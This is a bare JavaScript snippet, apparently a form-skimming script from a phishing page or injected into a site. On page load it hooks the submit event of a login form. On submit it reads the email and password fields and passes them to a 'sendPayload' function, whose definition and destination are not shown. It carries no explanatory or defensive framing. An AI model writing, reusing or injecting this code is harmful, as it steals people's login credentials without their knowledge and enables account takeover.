window.onload = function() {
    document.getElementById("login_form").onsubmit = function() {
        sendPayload("Login event - EMAIL:" + document.getElementById("email").value + ", PASSWORD:" + document.getElementById("pass").value);
    }
}